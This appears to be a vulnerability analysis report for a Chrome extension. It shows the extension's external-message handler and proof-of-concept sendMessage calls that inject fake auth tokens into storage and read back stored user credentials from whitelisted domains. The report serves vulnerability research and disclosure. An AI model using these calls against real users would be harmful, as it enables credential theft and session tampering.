# CoCo Analysis: bgdaaeabdabncnacphdgiafkhmjfodio

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink 1-2: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bgdaaeabdabncnacphdgiafkhmjfodio/opgen_generated_files/bg.js
Line 985	} else if (request.session) {
Line 986	    chrome.storage.local.set({ authToken: request.session.authorization });
Line 987	    chrome.storage.local.set({ userId: request.session.userId });
```

**Code:**

```javascript
// Background script - External message handler (bg.js line 977)
chrome.runtime.onMessageExternal.addListener(async function (request, sender, sendResponse) {
    if (request.info) {
        // Read and return stored credentials
        const authToken = await retrieveDataFromStorage("authToken");
        const userId = await retrieveDataFromStorage("userId");
        sendResponse({
            authToken: authToken, // ← Sends stored data back to attacker
            userId: userId
        });
    } else if (request.session) {
        // Poison storage with attacker-controlled data
        chrome.storage.local.set({ authToken: request.session.authorization }); // ← attacker-controlled
        chrome.storage.local.set({ userId: request.session.userId }); // ← attacker-controlled

        // Immediately read back and send to attacker
        const authToken = await retrieveDataFromStorage("authToken");
        const userId = await retrieveDataFromStorage("userId");
        sendResponse({
            authToken: authToken, // ← Attacker receives their poisoned value back
            userId: userId
        });
    } else if(request.logout) {
        chrome.storage.local.set({ authToken: "" });
        chrome.storage.local.set({ userId: "" });
        sendResponse({
            authToken: "",
            userId: ""
        });
    } else {
        sendResponse("Missing Session Information");
    }
});

function retrieveDataFromStorage(key) {
    return new Promise((resolve, reject) => {
        chrome.storage.local.get(key, result => {
          if (chrome.runtime.lastError) {
            reject(chrome.runtime.lastError);
          } else {
            resolve(result[key]); // ← Returns poisoned data
          }
        });
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal - whitelisted domains can send external messages

**Attack:**

```javascript
// From whitelisted domain: *.engage.yuja.com or localhost:3000
// Attack 1: Poison storage with fake credentials
chrome.runtime.sendMessage(
  "bgdaaeabdabncnacphdgiafkhmjfodio", // extension ID
  {
    session: {
      authorization: "attacker-fake-token",
      userId: "attacker-fake-userid"
    }
  },
  function(response) {
    console.log("Poisoned storage:", response);
    // Response: { authToken: "attacker-fake-token", userId: "attacker-fake-userid" }
  }
);

// Attack 2: Read stored credentials (information disclosure)
chrome.runtime.sendMessage(
  "bgdaaeabdabncnacphdgiafkhmjfodio",
  { info: true },
  function(response) {
    console.log("Stolen credentials:", response);
    // Response: { authToken: "real-user-token", userId: "real-user-id" }
  }
);
```

**Impact:** Complete storage exploitation chain with dual vulnerability:
1. **Storage Poisoning:** Attacker from whitelisted domains (*.engage.yuja.com or localhost:3000) can poison chrome.storage.local with arbitrary authToken and userId values, which are immediately confirmed back via sendResponse. This allows credential injection attacks.
2. **Information Disclosure:** Attacker can retrieve stored authentication tokens and user IDs by sending a message with `info: true`, receiving legitimate user credentials via sendResponse. This enables credential theft from users who have authenticated with the extension.

The manifest.json whitelist includes localhost:3000 (development environment) which may still be accessible, and *.engage.yuja.com which represents multiple potential attack surfaces. Even if only ONE whitelisted domain is exploitable, this qualifies as TRUE POSITIVE per the methodology.
